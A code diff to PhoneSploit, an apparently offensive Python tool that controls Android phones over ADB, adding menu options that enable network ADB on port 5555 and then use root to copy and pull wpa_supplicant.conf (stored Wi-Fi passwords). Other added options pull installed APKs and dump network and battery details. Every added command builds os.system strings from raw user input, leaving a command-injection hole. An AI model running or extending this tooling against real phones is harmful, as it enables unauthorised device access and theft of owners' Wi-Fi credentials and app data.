@@ -105,10 +105,11 @@ message = '''\n
 def main():
     option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
     if option == '1':
-            os.system("adb devices -l")
+        os.system("adb devices -l")
     elif option  ==  '2':
         os.system("adb disconnect")
     elif option == '3':
+        os.system("adb tcpip 5555")
         print ("\n[{0}+{1}] Enter a phones ip address.").format(Fore.RED, Fore.WHITE)
         ip = raw_input (arrow+" phonesploit"+Fore.RED + "(connect_phone) "+Fore.WHITE + "> ")
         os.system("adb connect "+ip+":5555")
@@ -210,18 +211,66 @@ def main():
         forward_port = raw_input("        "+arrow + "phonesploit"+Fore.RED + "(port_forward) "+Fore.WHITE + "> ")
         os.system("adb -s "+device_name+" forward tcp:"+port_device+" tcp:"+forward_port) 
 
+    elif option == '17':
+        try:
+            print  ("[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE)
+            device_name = raw_input(arrow + "phonesploit"+Fore.RED + "(wpa_grab) "+Fore.WHITE + "> ")
+            print (Fore.WHITE + "    [{0}+{1}]{1}THE DEVICE NEEDS TO BE ROOTED TO CONTINUE TO EXIT USE CTRL +C").format(Fore.RED, Fore.WHITE)
+            print("     "+connect)
+            print  ("    [{0}+{1}]Enter where you want the file to be saved.").format(Fore.RED, Fore.WHITE)
+            location = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(wpa_grab) "+Fore.WHITE + "> ")      
+            os.system("adb -s "+device_name+" shell "+"su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'")
+            os.system("adb -s "+device_name+" pull /sdcard/wpa_supplicant.conf "+location)
+        except KeyboardInterrupt:
+            main()    
+
+    elif option == '18':
+        print  ("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE)
+        device_name = raw_input(arrow + "phonesploit"+Fore.RED + "(mac_inet) "+Fore.WHITE + "> ")
+        os.system("adb -s " +device_name+ " shell ip address show wlan0")
+        main()
+
+    elif option == '19':
+        print  ("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE)
+        device_name = raw_input(arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
+        print("     "+connect)
+        print  ("    [{0}+{1}]Enter a package name. They look like this --> com.snapchat.android").format(Fore.RED, Fore.WHITE)
+        package_name = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
+        os.system("adb -s "+device_name+" shell pm path "+package_name)
+        print("         "+connect)       
+        print  ("        [{0}+{1}]Enter The path.looks like this /data/app/com.snapchat.android-qWgDcBiCEvANq6op_NPqeA==/base.apk").format(Fore.RED, Fore.WHITE)
+        path = raw_input("        "+arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
+        print("             "+connect)
+        print("            [{0}+{1}]Enter The location to store the apk: ")  .format(Fore.RED, Fore.WHITE)
+        location =   raw_input("            "+arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
+        os.system("adb -s " +device_name+" pull "+path+" "+location)
+        main()
+
+    elif option == '20':
+        print  ("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE)
+        device_name = raw_input(arrow + "phonesploit"+Fore.RED + "(battery) "+Fore.WHITE + "> ")
+        os.system("adb -s " +device_name+ " shell dumpsys battery")
+        main()
+
+    elif option == '21':
+        print  ("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE)
+        device_name = raw_input(arrow + "phonesploit"+Fore.RED + "(net_stat) "+Fore.WHITE + "> ")
+        os.system("adb -s " +device_name+ " shell netstat")
+        main()
+
+
     elif option  == '0':
-        os.system('clear')
+        os.system('cls')
         banner_title = random.choice([logo_design_1,logo_design_2,logo_design_3,logo_design_4])
         print Fore.RED + banner_title  
         print message
+
 
     elif option == '99':
         exit()
 
 
     main()
-
 
 
 #=============================
